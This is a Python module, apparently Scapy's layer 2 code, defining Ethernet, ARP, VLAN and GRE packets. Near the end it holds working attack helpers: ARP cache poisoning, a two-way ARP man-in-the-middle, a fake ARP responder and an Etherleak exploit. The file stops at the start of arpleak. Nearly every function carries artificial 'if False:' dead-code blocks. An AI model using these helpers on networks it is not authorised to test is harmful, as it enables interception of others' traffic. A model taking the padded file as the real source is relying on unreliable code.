"""
Classes and functions for layer 2 protocols.
"""
import itertools
import socket
import struct
import time
from scapy.ansmachine import AnsweringMachine
from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.base_classes import Gen, Net
from scapy.compat import chb, orb
from scapy.config import conf
from scapy import consts
from scapy.data import ARPHDR_ETHER, ARPHDR_LOOPBACK, ARPHDR_METRICOM, DLT_ETHERNET_MPACKET, DLT_LINUX_IRDA, DLT_LINUX_SLL, DLT_LINUX_SLL2, DLT_LOOP, DLT_NULL, ETHER_ANY, ETHER_BROADCAST, ETHER_TYPES, ETH_P_ARP, ETH_P_MACSEC
from scapy.error import warning, ScapyNoDstMacException, log_runtime
from scapy.fields import BCDFloatField, BitField, ByteEnumField, ByteField, ConditionalField, FCSField, FieldLenField, IP6Field, IPField, IntEnumField, IntField, LenField, MACField, MultipleTypeField, OUIField, ShortEnumField, ShortField, SourceIP6Field, SourceIPField, StrFixedLenField, StrLenField, ThreeBytesField, XByteField, XIntField, XShortEnumField, XShortField
from scapy.interfaces import _GlobInterfaceType
from scapy.packet import bind_layers, Packet
from scapy.plist import PacketList, QueryAnswer, SndRcvList, _PacketList
from scapy.sendrecv import sendp, srp, srp1, srploop
from scapy.utils import checksum, hexdump, hexstr, inet_ntoa, inet_aton, mac2str, valid_mac, valid_net, valid_net6
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple, Type, Union, cast
from scapy.interfaces import NetworkInterface
if conf.route is None:
    import scapy.route
_ResolverCallable = Callable[[Packet, Packet], Optional[str]]

class Neighbor:

    def __init__(self):
        if False:
            i = 10
            return i + 15
        self.resolvers = {}

    def register_l3(self, l2, l3, resolve_method):
        if False:
            for i in range(10):
                print('nop')
        self.resolvers[l2, l3] = resolve_method

    def resolve(self, l2inst, l3inst):
        if False:
            for i in range(10):
                print('nop')
        k = (l2inst.__class__, l3inst.__class__)
        if k in self.resolvers:
            return self.resolvers[k](l2inst, l3inst)
        return None

    def __repr__(self):
        if False:
            print('Hello World!')
        return '\n'.join(('%-15s -> %-15s' % (l2.__name__, l3.__name__) for (l2, l3) in self.resolvers))
conf.neighbor = Neighbor()
_arp_cache = conf.netcache.new_cache('arp_cache', 120)

@conf.commands.register
def getmacbyip(ip, chainCC=0):
    if False:
        i = 10
        return i + 15
    'Return MAC address corresponding to a given IP address'
    if isinstance(ip, Net):
        ip = next(iter(ip))
    ip = inet_ntoa(inet_aton(ip or '0.0.0.0'))
    tmp = [orb(e) for e in inet_aton(ip)]
    if tmp[0] & 240 == 224:
        return '01:00:5e:%.2x:%.2x:%.2x' % (tmp[1] & 127, tmp[2], tmp[3])
    (iff, _, gw) = conf.route.route(ip)
    if iff == conf.loopback_name or ip in conf.route.get_if_bcast(iff):
        return 'ff:ff:ff:ff:ff:ff'
    if gw != '0.0.0.0':
        ip = gw
    mac = _arp_cache.get(ip)
    if mac:
        return mac
    try:
        res = srp1(Ether(dst=ETHER_BROADCAST) / ARP(op='who-has', pdst=ip), type=ETH_P_ARP, iface=iff, timeout=2, verbose=0, chainCC=chainCC, nofilter=1)
    except Exception as ex:
        warning('getmacbyip failed on %s', ex)
        return None
    if res is not None:
        mac = res.payload.hwsrc
        _arp_cache[ip] = mac
        return mac
    return None

class DestMACField(MACField):

    def __init__(self, name):
        if False:
            print('Hello World!')
        MACField.__init__(self, name, None)

    def i2h(self, pkt, x):
        if False:
            for i in range(10):
                print('nop')
        if x is None and pkt is not None:
            x = 'None (resolved on build)'
        return super(DestMACField, self).i2h(pkt, x)

    def i2m(self, pkt, x):
        if False:
            print('Hello World!')
        if x is None and pkt is not None:
            try:
                x = conf.neighbor.resolve(pkt, pkt.payload)
            except socket.error:
                pass
            if x is None:
                if conf.raise_no_dst_mac:
                    raise ScapyNoDstMacException()
                else:
                    x = 'ff:ff:ff:ff:ff:ff'
                    warning('MAC address to reach destination not found. Using broadcast.')
        return super(DestMACField, self).i2m(pkt, x)

class SourceMACField(MACField):
    __slots__ = ['getif']

    def __init__(self, name, getif=None):
        if False:
            for i in range(10):
                print('nop')
        MACField.__init__(self, name, None)
        self.getif = (lambda pkt: pkt.route()[0]) if getif is None else getif

    def i2h(self, pkt, x):
        if False:
            while True:
                i = 10
        if x is None:
            iff = self.getif(pkt)
            if iff is None:
                iff = conf.iface
            if iff:
                try:
                    x = get_if_hwaddr(iff)
                except Exception as e:
                    warning('Could not get the source MAC: %s' % e)
            if x is None:
                x = '00:00:00:00:00:00'
        return super(SourceMACField, self).i2h(pkt, x)

    def i2m(self, pkt, x):
        if False:
            return 10
        return super(SourceMACField, self).i2m(pkt, self.i2h(pkt, x))
HARDWARE_TYPES = {1: 'Ethernet (10Mb)', 2: 'Ethernet (3Mb)', 3: 'AX.25', 4: 'Proteon ProNET Token Ring', 5: 'Chaos', 6: 'IEEE 802 Networks', 7: 'ARCNET', 8: 'Hyperchannel', 9: 'Lanstar', 10: 'Autonet Short Address', 11: 'LocalTalk', 12: 'LocalNet', 13: 'Ultra link', 14: 'SMDS', 15: 'Frame relay', 16: 'ATM', 17: 'HDLC', 18: 'Fibre Channel', 19: 'ATM', 20: 'Serial Line', 21: 'ATM'}
ETHER_TYPES[34984] = '802_1AD'
ETHER_TYPES[35047] = '802_1AH'
ETHER_TYPES[ETH_P_MACSEC] = '802_1AE'

class Ether(Packet):
    name = 'Ethernet'
    fields_desc = [DestMACField('dst'), SourceMACField('src'), XShortEnumField('type', 36864, ETHER_TYPES)]
    __slots__ = ['_defrag_pos']

    def hashret(self):
        if False:
            i = 10
            return i + 15
        return struct.pack('H', self.type) + self.payload.hashret()

    def answers(self, other):
        if False:
            while True:
                i = 10
        if isinstance(other, Ether):
            if self.type == other.type:
                return self.payload.answers(other.payload)
        return 0

    def mysummary(self):
        if False:
            for i in range(10):
                print('nop')
        return self.sprintf('%src% > %dst% (%type%)')

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if False:
            print('Hello World!')
        if _pkt and len(_pkt) >= 14:
            if struct.unpack('!H', _pkt[12:14])[0] <= 1500:
                return Dot3
        return cls

class Dot3(Packet):
    name = '802.3'
    fields_desc = [DestMACField('dst'), SourceMACField('src'), LenField('len', None, 'H')]

    def extract_padding(self, s):
        if False:
            i = 10
            return i + 15
        tmp_len = self.len
        return (s[:tmp_len], s[tmp_len:])

    def answers(self, other):
        if False:
            for i in range(10):
                print('nop')
        if isinstance(other, Dot3):
            return self.payload.answers(other.payload)
        return 0

    def mysummary(self):
        if False:
            for i in range(10):
                print('nop')
        return '802.3 %s > %s' % (self.src, self.dst)

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if False:
            return 10
        if _pkt and len(_pkt) >= 14:
            if struct.unpack('!H', _pkt[12:14])[0] > 1500:
                return Ether
        return cls

class LLC(Packet):
    name = 'LLC'
    fields_desc = [XByteField('dsap', 0), XByteField('ssap', 0), ByteField('ctrl', 0)]

def l2_register_l3(l2: Packet, l3: Packet) -> Optional[str]:
    if False:
        while True:
            i = 10
    '\n    Delegates resolving the default L2 destination address to the payload of L3.\n    '
    neighbor = conf.neighbor
    return neighbor.resolve(l2, l3.payload)
conf.neighbor.register_l3(Ether, LLC, l2_register_l3)
conf.neighbor.register_l3(Dot3, LLC, l2_register_l3)
COOKED_LINUX_PACKET_TYPES = {0: 'unicast', 1: 'broadcast', 2: 'multicast', 3: 'unicast-to-another-host', 4: 'sent-by-us'}

class CookedLinux(Packet):
    name = 'cooked linux'
    fields_desc = [ShortEnumField('pkttype', 0, COOKED_LINUX_PACKET_TYPES), XShortField('lladdrtype', 512), ShortField('lladdrlen', 0), StrFixedLenField('src', b'', 8), XShortEnumField('proto', 2048, ETHER_TYPES)]

class CookedLinuxV2(CookedLinux):
    name = 'cooked linux v2'
    fields_desc = [XShortEnumField('proto', 2048, ETHER_TYPES), ShortField('reserved', 0), IntField('ifindex', 0), XShortField('lladdrtype', 512), ByteEnumField('pkttype', 0, COOKED_LINUX_PACKET_TYPES), ByteField('lladdrlen', 0), StrFixedLenField('src', b'', 8)]

class MPacketPreamble(Packet):
    name = 'MPacket Preamble'
    fields_desc = [StrFixedLenField('preamble', b'', length=8), FCSField('fcs', 0, fmt='!I')]

class SNAP(Packet):
    name = 'SNAP'
    fields_desc = [OUIField('OUI', 0), XShortEnumField('code', 0, ETHER_TYPES)]
conf.neighbor.register_l3(Dot3, SNAP, l2_register_l3)

class Dot1Q(Packet):
    name = '802.1Q'
    aliastypes = [Ether]
    fields_desc = [BitField('prio', 0, 3), BitField('dei', 0, 1), BitField('vlan', 1, 12), XShortEnumField('type', 0, ETHER_TYPES)]
    deprecated_fields = {'id': ('dei', '2.5.0')}

    def answers(self, other):
        if False:
            i = 10
            return i + 15
        if isinstance(other, Dot1Q):
            if self.type == other.type and self.vlan == other.vlan:
                return self.payload.answers(other.payload)
        else:
            return self.payload.answers(other)
        return 0

    def default_payload_class(self, pay):
        if False:
            i = 10
            return i + 15
        if self.type <= 1500:
            return LLC
        return conf.raw_layer

    def extract_padding(self, s):
        if False:
            i = 10
            return i + 15
        if self.type <= 1500:
            return (s[:self.type], s[self.type:])
        return (s, None)

    def mysummary(self):
        if False:
            i = 10
            return i + 15
        if isinstance(self.underlayer, Ether):
            return self.underlayer.sprintf('802.1q %Ether.src% > %Ether.dst% (%Dot1Q.type%) vlan %Dot1Q.vlan%')
        else:
            return self.sprintf('802.1q (%Dot1Q.type%) vlan %Dot1Q.vlan%')
conf.neighbor.register_l3(Ether, Dot1Q, l2_register_l3)

class STP(Packet):
    name = 'Spanning Tree Protocol'
    fields_desc = [ShortField('proto', 0), ByteField('version', 0), ByteField('bpdutype', 0), ByteField('bpduflags', 0), ShortField('rootid', 0), MACField('rootmac', ETHER_ANY), IntField('pathcost', 0), ShortField('bridgeid', 0), MACField('bridgemac', ETHER_ANY), ShortField('portid', 0), BCDFloatField('age', 1), BCDFloatField('maxage', 20), BCDFloatField('hellotime', 2), BCDFloatField('fwddelay', 15)]

class ARP(Packet):
    name = 'ARP'
    fields_desc = [XShortEnumField('hwtype', 1, HARDWARE_TYPES), XShortEnumField('ptype', 2048, ETHER_TYPES), FieldLenField('hwlen', None, fmt='B', length_of='hwsrc'), FieldLenField('plen', None, fmt='B', length_of='psrc'), ShortEnumField('op', 1, {'who-has': 1, 'is-at': 2, 'RARP-req': 3, 'RARP-rep': 4, 'Dyn-RARP-req': 5, 'Dyn-RAR-rep': 6, 'Dyn-RARP-err': 7, 'InARP-req': 8, 'InARP-rep': 9}), MultipleTypeField([(SourceMACField('hwsrc'), (lambda pkt: pkt.hwtype == 1 and pkt.hwlen == 6, lambda pkt, val: pkt.hwtype == 1 and (pkt.hwlen == 6 or (pkt.hwlen is None and (val is None or len(val) == 6 or valid_mac(val))))))], StrFixedLenField('hwsrc', None, length_from=lambda pkt: pkt.hwlen)), MultipleTypeField([(SourceIPField('psrc', 'pdst'), (lambda pkt: pkt.ptype == 2048 and pkt.plen == 4, lambda pkt, val: pkt.ptype == 2048 and (pkt.plen == 4 or (pkt.plen is None and (val is None or valid_net(val)))))), (SourceIP6Field('psrc', 'pdst'), (lambda pkt: pkt.ptype == 34525 and pkt.plen == 16, lambda pkt, val: pkt.ptype == 34525 and (pkt.plen == 16 or (pkt.plen is None and (val is None or valid_net6(val))))))], StrFixedLenField('psrc', None, length_from=lambda pkt: pkt.plen)), MultipleTypeField([(MACField('hwdst', ETHER_ANY), (lambda pkt: pkt.hwtype == 1 and pkt.hwlen == 6, lambda pkt, val: pkt.hwtype == 1 and (pkt.hwlen == 6 or (pkt.hwlen is None and (val is None or len(val) == 6 or valid_mac(val))))))], StrFixedLenField('hwdst', None, length_from=lambda pkt: pkt.hwlen)), MultipleTypeField([(IPField('pdst', '0.0.0.0'), (lambda pkt: pkt.ptype == 2048 and pkt.plen == 4, lambda pkt, val: pkt.ptype == 2048 and (pkt.plen == 4 or (pkt.plen is None and (val is None or valid_net(val)))))), (IP6Field('pdst', '::'), (lambda pkt: pkt.ptype == 34525 and pkt.plen == 16, lambda pkt, val: pkt.ptype == 34525 and (pkt.plen == 16 or (pkt.plen is None and (val is None or valid_net6(val))))))], StrFixedLenField('pdst', None, length_from=lambda pkt: pkt.plen))]

    def hashret(self):
        if False:
            i = 10
            return i + 15
        return struct.pack('>HHH', self.hwtype, self.ptype, (self.op + 1) // 2) + self.payload.hashret()

    def answers(self, other):
        if False:
            i = 10
            return i + 15
        if not isinstance(other, ARP):
            return False
        if self.op != other.op + 1:
            return False
        self_psrc = self.get_field('psrc').i2m(self, self.psrc)
        other_pdst = other.get_field('pdst').i2m(other, other.pdst)
        return self_psrc[:len(other_pdst)] == other_pdst[:len(self_psrc)]

    def route(self):
        if False:
            i = 10
            return i + 15
        (fld, dst) = cast(Tuple[MultipleTypeField, str], self.getfield_and_val('pdst'))
        (fld_inner, dst) = fld._find_fld_pkt_val(self, dst)
        if isinstance(dst, Gen):
            dst = next(iter(dst))
        if isinstance(fld_inner, IP6Field):
            return conf.route6.route(dst)
        elif isinstance(fld_inner, IPField):
            return conf.route.route(dst)
        else:
            return (None, None, None)

    def extract_padding(self, s):
        if False:
            i = 10
            return i + 15
        return (b'', s)

    def mysummary(self):
        if False:
            i = 10
            return i + 15
        if self.op == 1:
            return self.sprintf('ARP who has %pdst% says %psrc%')
        if self.op == 2:
            return self.sprintf('ARP is at %hwsrc% says %psrc%')
        return self.sprintf('ARP %op% %psrc% > %pdst%')

def l2_register_l3_arp(l2: Packet, l3: Packet) -> Optional[str]:
    if False:
        return 10
    '\n    Resolves the default L2 destination address when ARP is used.\n    '
    if l3.op == 1:
        return 'ff:ff:ff:ff:ff:ff'
    elif l3.op == 2:
        log_runtime.warning('You should be providing the Ethernet destination MAC address when sending an is-at ARP.')
    plen = l3.get_field('pdst').i2len(l3, l3.pdst)
    if plen == 4:
        return getmacbyip(l3.pdst)
    elif plen == 32:
        from scapy.layers.inet6 import getmacbyip6
        return getmacbyip6(l3.pdst)
    log_runtime.warning('You should be providing the Ethernet destination mac when sending this kind of ARP packets.')
    return None
conf.neighbor.register_l3(Ether, ARP, l2_register_l3_arp)

class GRErouting(Packet):
    name = 'GRE routing information'
    fields_desc = [ShortField('address_family', 0), ByteField('SRE_offset', 0), FieldLenField('SRE_len', None, 'routing_info', 'B'), StrLenField('routing_info', b'', length_from=lambda pkt: pkt.SRE_len)]

class GRE(Packet):
    name = 'GRE'
    deprecated_fields = {'seqence_number': ('sequence_number', '2.4.4')}
    fields_desc = [BitField('chksum_present', 0, 1), BitField('routing_present', 0, 1), BitField('key_present', 0, 1), BitField('seqnum_present', 0, 1), BitField('strict_route_source', 0, 1), BitField('recursion_control', 0, 3), BitField('flags', 0, 5), BitField('version', 0, 3), XShortEnumField('proto', 0, ETHER_TYPES), ConditionalField(XShortField('chksum', None), lambda pkt: pkt.chksum_present == 1 or pkt.routing_present == 1), ConditionalField(XShortField('offset', None), lambda pkt: pkt.chksum_present == 1 or pkt.routing_present == 1), ConditionalField(XIntField('key', None), lambda pkt: pkt.key_present == 1), ConditionalField(XIntField('sequence_number', None), lambda pkt: pkt.seqnum_present == 1)]

    @classmethod
    def dispatch_hook(cls, _pkt=None, *args, **kargs):
        if False:
            print('Hello World!')
        if _pkt and struct.unpack('!H', _pkt[2:4])[0] == 34827:
            return GRE_PPTP
        return cls

    def post_build(self, p, pay):
        if False:
            for i in range(10):
                print('nop')
        p += pay
        if self.chksum_present and self.chksum is None:
            c = checksum(p)
            p = p[:4] + chb(c >> 8 & 255) + chb(c & 255) + p[6:]
        return p

class GRE_PPTP(GRE):
    """
    Enhanced GRE header used with PPTP
    RFC 2637
    """
    name = 'GRE PPTP'
    deprecated_fields = {'seqence_number': ('sequence_number', '2.4.4')}
    fields_desc = [BitField('chksum_present', 0, 1), BitField('routing_present', 0, 1), BitField('key_present', 1, 1), BitField('seqnum_present', 0, 1), BitField('strict_route_source', 0, 1), BitField('recursion_control', 0, 3), BitField('acknum_present', 0, 1), BitField('flags', 0, 4), BitField('version', 1, 3), XShortEnumField('proto', 34827, ETHER_TYPES), ShortField('payload_len', None), ShortField('call_id', None), ConditionalField(XIntField('sequence_number', None), lambda pkt: pkt.seqnum_present == 1), ConditionalField(XIntField('ack_number', None), lambda pkt: pkt.acknum_present == 1)]

    def post_build(self, p, pay):
        if False:
            print('Hello World!')
        p += pay
        if self.payload_len is None:
            pay_len = len(pay)
            p = p[:4] + chb(pay_len >> 8 & 255) + chb(pay_len & 255) + p[6:]
        return p

class LoIntEnumField(IntEnumField):

    def m2i(self, pkt, x):
        if False:
            i = 10
            return i + 15
        return x >> 24

    def i2m(self, pkt, x):
        if False:
            for i in range(10):
                print('nop')
        return cast(int, x) << 24
LOOPBACK_TYPES = {2: 'IPv4', 7: 'OSI', 16: 'Appletalk', 23: 'Netware IPX/SPX', 24: 'IPv6', 28: 'IPv6', 30: 'IPv6'}

class Loopback(Packet):
    """\\*BSD loopback layer"""
    name = 'Loopback'
    if consts.OPENBSD:
        fields_desc = [IntEnumField('type', 2, LOOPBACK_TYPES)]
    else:
        fields_desc = [LoIntEnumField('type', 2, LOOPBACK_TYPES)]
    __slots__ = ['_defrag_pos']

class Dot1AD(Dot1Q):
    name = '802_1AD'

class Dot1AH(Packet):
    name = '802_1AH'
    fields_desc = [BitField('prio', 0, 3), BitField('dei', 0, 1), BitField('nca', 0, 1), BitField('res1', 0, 1), BitField('res2', 0, 2), ThreeBytesField('isid', 0)]

    def answers(self, other):
        if False:
            i = 10
            return i + 15
        if isinstance(other, Dot1AH):
            if self.isid == other.isid:
                return self.payload.answers(other.payload)
        return 0

    def mysummary(self):
        if False:
            return 10
        return self.sprintf('802.1ah (isid=%Dot1AH.isid%')
conf.neighbor.register_l3(Ether, Dot1AH, l2_register_l3)
bind_layers(Dot3, LLC)
bind_layers(Ether, LLC, type=122)
bind_layers(Ether, LLC, type=34928)
bind_layers(Ether, Dot1Q, type=33024)
bind_layers(Ether, Dot1AD, type=34984)
bind_layers(Ether, Dot1AH, type=35047)
bind_layers(Dot1AD, Dot1AD, type=34984)
bind_layers(Dot1AD, Dot1Q, type=33024)
bind_layers(Dot1AD, Dot1AH, type=35047)
bind_layers(Dot1Q, Dot1AD, type=34984)
bind_layers(Dot1Q, Dot1AH, type=35047)
bind_layers(Dot1AH, Ether)
bind_layers(Ether, Ether, type=1)
bind_layers(Ether, ARP, type=2054)
bind_layers(CookedLinux, LLC, proto=122)
bind_layers(CookedLinux, Dot1Q, proto=33024)
bind_layers(CookedLinux, Dot1AD, type=34984)
bind_layers(CookedLinux, Dot1AH, type=35047)
bind_layers(CookedLinux, Ether, proto=1)
bind_layers(CookedLinux, ARP, proto=2054)
bind_layers(MPacketPreamble, Ether)
bind_layers(GRE, LLC, proto=122)
bind_layers(GRE, Dot1Q, proto=33024)
bind_layers(GRE, Dot1AD, type=34984)
bind_layers(GRE, Dot1AH, type=35047)
bind_layers(GRE, Ether, proto=25944)
bind_layers(GRE, ARP, proto=2054)
bind_layers(GRE, GRErouting, {'routing_present': 1})
bind_layers(GRErouting, conf.raw_layer, {'address_family': 0, 'SRE_len': 0})
bind_layers(GRErouting, GRErouting)
bind_layers(LLC, STP, dsap=66, ssap=66, ctrl=3)
bind_layers(LLC, SNAP, dsap=170, ssap=170, ctrl=3)
bind_layers(SNAP, Dot1Q, code=33024)
bind_layers(SNAP, Dot1AD, type=34984)
bind_layers(SNAP, Dot1AH, type=35047)
bind_layers(SNAP, Ether, code=1)
bind_layers(SNAP, ARP, code=2054)
bind_layers(SNAP, STP, code=267)
conf.l2types.register(ARPHDR_ETHER, Ether)
conf.l2types.register_num2layer(ARPHDR_METRICOM, Ether)
conf.l2types.register_num2layer(ARPHDR_LOOPBACK, Ether)
conf.l2types.register_layer2num(ARPHDR_ETHER, Dot3)
conf.l2types.register(DLT_LINUX_SLL, CookedLinux)
conf.l2types.register(DLT_LINUX_SLL2, CookedLinuxV2)
conf.l2types.register(DLT_ETHERNET_MPACKET, MPacketPreamble)
conf.l2types.register_num2layer(DLT_LINUX_IRDA, CookedLinux)
conf.l2types.register(DLT_LOOP, Loopback)
conf.l2types.register_num2layer(DLT_NULL, Loopback)
conf.l3types.register(ETH_P_ARP, ARP)

@conf.commands.register
def arpcachepoison(target, addresses, broadcast=False, count=None, interval=15, **kwargs):
    if False:
        print('Hello World!')
    'Poison targets\' ARP cache\n\n    :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs\n                   or the subnet that will be poisoned.\n    :param addresses: Can be either a string, a tuple of a list of tuples.\n                      If it\'s a string, it\'s the IP to advertise to the victim,\n                      with the local interface\'s MAC. If it\'s a tuple,\n                      it\'s ("IP", "MAC"). It it\'s a list, it\'s [("IP", "MAC")].\n                      "IP" can be a subnet of course.\n    :param broadcast: Use broadcast ethernet\n\n    Examples for target "192.168.0.2"::\n\n        >>> arpcachepoison("192.168.0.2", "192.168.0.1")\n        >>> arpcachepoison("192.168.0.1/24", "192.168.0.1")\n        >>> arpcachepoison(["192.168.0.2", "192.168.0.3"], "192.168.0.1")\n        >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))\n        >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),\n        ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])\n\n    '
    if isinstance(target, str):
        targets = Net(target)
        str_target = target
    else:
        targets = target
        str_target = target[0]
    if isinstance(addresses, str):
        couple_list = [(addresses, get_if_hwaddr(conf.route.route(str_target)[0]))]
    elif isinstance(addresses, tuple):
        couple_list = [addresses]
    else:
        couple_list = addresses
    p: List[Packet] = [Ether(src=y, dst='ff:ff:ff:ff:ff:ff' if broadcast else None) / ARP(op='who-has', psrc=x, pdst=targets, hwsrc=y, hwdst='00:00:00:00:00:00') for (x, y) in couple_list]
    if count is not None:
        sendp(p, iface_hint=str_target, count=count, inter=interval, **kwargs)
        return
    try:
        while True:
            sendp(p, iface_hint=str_target, **kwargs)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

@conf.commands.register
def arp_mitm(ip1, ip2, mac1=None, mac2=None, broadcast=False, target_mac=None, iface=None, inter=3):
    if False:
        for i in range(10):
            print('nop')
    'ARP MitM: poison 2 target\'s ARP cache\n\n    :param ip1: IPv4 of the first machine\n    :param ip2: IPv4 of the second machine\n    :param mac1: MAC of the first machine (optional: will ARP otherwise)\n    :param mac2: MAC of the second machine (optional: will ARP otherwise)\n    :param broadcast: if True, will use broadcast mac for MitM by default\n    :param target_mac: MAC of the attacker (optional: default to the interface\'s one)\n    :param iface: the network interface. (optional: default, route for ip1)\n\n    Example usage::\n\n        $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface\n        $ sysctl net.ipv4.ip_forward=1\n        $ sudo scapy\n        >>> arp_mitm("192.168.122.156", "192.168.122.17")\n\n    Alternative usages:\n        >>> arp_mitm("10.0.0.1", "10.1.1.0/21", iface="eth1")\n        >>> arp_mitm("10.0.0.1", "10.1.1.2",\n        ...          target_mac="aa:aa:aa:aa:aa:aa",\n        ...          mac2="00:1e:eb:bf:c1:ab")\n\n    .. warning::\n        If using a subnet, this will first perform an arping, unless broadcast is on!\n\n    Remember to change the sysctl settings back..\n    '
    if not iface:
        iface = conf.route.route(ip1)[0]
    if not target_mac:
        target_mac = get_if_hwaddr(iface)

    def _tups(ip, mac):
        if False:
            print('Hello World!')
        if mac is None:
            if broadcast:
                return [(ip, 'ff:ff:ff:ff:ff:ff')]
            return [(x.query.pdst, x.answer.hwsrc) for x in arping(ip, verbose=0)[0]]
        elif isinstance(mac, list):
            return [(ip, x) for x in mac]
        else:
            return [(ip, mac)]
    tup1 = _tups(ip1, mac1)
    if not tup1:
        raise OSError(f'Could not resolve {ip1}')
    tup2 = _tups(ip2, mac2)
    if not tup2:
        raise OSError(f'Could not resolve {ip2}')
    print(f'MITM on {iface}: %s <--> {target_mac} <--> %s' % ([x[1] for x in tup1], [x[1] for x in tup2]))
    srploop(list(itertools.chain((x for (ipa, maca) in tup1 for (ipb, _) in tup2 for x in Ether(dst=maca, src=target_mac) / ARP(op='who-has', psrc=ipb, pdst=ipa, hwsrc=target_mac, hwdst='00:00:00:00:00:00')), (x for (ipb, macb) in tup2 for (ipa, _) in tup1 for x in Ether(dst=macb, src=target_mac) / ARP(op='who-has', psrc=ipa, pdst=ipb, hwsrc=target_mac, hwdst='00:00:00:00:00:00')))), filter='arp and arp[7] = 2', inter=inter, iface=iface, timeout=0.5, verbose=1, store=0)
    print('Restoring...')
    sendp(list(itertools.chain((x for (ipa, maca) in tup1 for (ipb, macb) in tup2 for x in Ether(dst=maca, src=macb) / ARP(op='who-has', psrc=ipb, pdst=ipa, hwsrc=macb, hwdst='00:00:00:00:00:00')), (x for (ipb, macb) in tup2 for (ipa, maca) in tup1 for x in Ether(dst=macb, src=maca) / ARP(op='who-has', psrc=ipa, pdst=ipb, hwsrc=maca, hwdst='00:00:00:00:00:00')))), iface=iface)

class ARPingResult(SndRcvList):

    def __init__(self, res=None, name='ARPing', stats=None):
        if False:
            while True:
                i = 10
        SndRcvList.__init__(self, res, name, stats)

    def show(self, *args, **kwargs):
        if False:
            i = 10
            return i + 15
        '\n        Print the list of discovered MAC addresses.\n        '
        data = list()
        padding = 0
        for (s, r) in self.res:
            manuf = conf.manufdb._get_short_manuf(r.src)
            manuf = 'unknown' if manuf == r.src else manuf
            padding = max(padding, len(manuf))
            data.append((r[Ether].src, manuf, r[ARP].psrc))
        for (src, manuf, psrc) in data:
            print('  %-17s %-*s %s' % (src, padding, manuf, psrc))

@conf.commands.register
def arping(net, timeout=2, cache=0, verbose=None, **kargs):
    if False:
        print('Hello World!')
    'Send ARP who-has requests to determine which hosts are up\narping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None\nSet cache=True if you want arping to modify internal ARP-Cache'
    if verbose is None:
        verbose = conf.verb
    (ans, unans) = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=net), verbose=verbose, filter='arp and arp[7] = 2', timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res)
    if cache and ans is not None:
        for pair in ans:
            _arp_cache[pair[1].psrc] = pair[1].hwsrc
    if ans is not None and verbose:
        ans.show()
    return (ans, unans)

@conf.commands.register
def is_promisc(ip, fake_bcast='ff:ff:00:00:00:00', **kargs):
    if False:
        i = 10
        return i + 15
    'Try to guess if target is in Promisc mode. The target is provided by its ip.'
    responses = srp1(Ether(dst=fake_bcast) / ARP(op='who-has', pdst=ip), type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0, **kargs)
    return responses is not None

@conf.commands.register
def promiscping(net, timeout=2, fake_bcast='ff:ff:ff:ff:ff:fe', **kargs):
    if False:
        i = 10
        return i + 15
    'Send ARP who-has requests to determine which hosts are in promiscuous mode\n    promiscping(net, iface=conf.iface)'
    (ans, unans) = srp(Ether(dst=fake_bcast) / ARP(pdst=net), filter='arp and arp[7] = 2', timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res, name='PROMISCPing')
    ans.display()
    return (ans, unans)

class ARP_am(AnsweringMachine[Packet]):
    """Fake ARP Relay Daemon (farpd)

    example:
    To respond to an ARP request for 192.168.100 replying on the
    ingress interface::

      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05')

    To respond on a different interface add the interface parameter::

      farpd(IP_addr='192.168.1.100',ARP_addr='00:01:02:03:04:05',iface='eth0')

    To respond on ANY arp request on an interface with mac address ARP_addr::

      farpd(ARP_addr='00:01:02:03:04:05',iface='eth1')

    To respond on ANY arp request with my mac addr on the given interface::

      farpd(iface='eth1')

    Optional Args::

     inter=<n>   Interval in seconds between ARP replies being sent

    """
    function_name = 'farpd'
    filter = 'arp'
    send_function = staticmethod(sendp)

    def parse_options(self, IP_addr=None, ARP_addr=None, from_ip=None):
        if False:
            while True:
                i = 10
        if isinstance(IP_addr, str):
            self.IP_addr = Net(IP_addr)
        else:
            self.IP_addr = IP_addr
        if isinstance(from_ip, str):
            self.from_ip = Net(from_ip)
        else:
            self.from_ip = from_ip
        self.ARP_addr = ARP_addr

    def is_request(self, req):
        if False:
            print('Hello World!')
        if not req.haslayer(ARP):
            return False
        arp = req[ARP]
        return arp.op == 1 and (self.IP_addr is None or arp.pdst in self.IP_addr) and (self.from_ip is None or arp.psrc in self.from_ip)

    def make_reply(self, req):
        if False:
            return 10
        ether = req[Ether]
        arp = req[ARP]
        if 'iface' in self.optsend:
            iff = cast(Union[NetworkInterface, str], self.optsend.get('iface'))
        else:
            (iff, a, gw) = conf.route.route(arp.psrc)
        self.iff = iff
        if self.ARP_addr is None:
            try:
                ARP_addr = get_if_hwaddr(iff)
            except Exception:
                ARP_addr = '00:00:00:00:00:00'
        else:
            ARP_addr = self.ARP_addr
        resp = Ether(dst=ether.src, src=ARP_addr) / ARP(op='is-at', hwsrc=ARP_addr, psrc=arp.pdst, hwdst=arp.hwsrc, pdst=arp.psrc)
        return resp

    def send_reply(self, reply, send_function=None):
        if False:
            i = 10
            return i + 15
        if 'iface' in self.optsend:
            self.send_function(reply, **self.optsend)
        else:
            self.send_function(reply, iface=self.iff, **self.optsend)

    def print_reply(self, req, reply):
        if False:
            while True:
                i = 10
        print('%s ==> %s on %s' % (req.summary(), reply.summary(), self.iff))

@conf.commands.register
def etherleak(target, **kargs):
    if False:
        while True:
            i = 10
    'Exploit Etherleak flaw'
    return srp(Ether() / ARP(pdst=target), prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load), filter='arp', **kargs)

@conf.commands.register
def arpleak(target, plen=255, hwlen=255, **kargs):
    if False:
        return 10
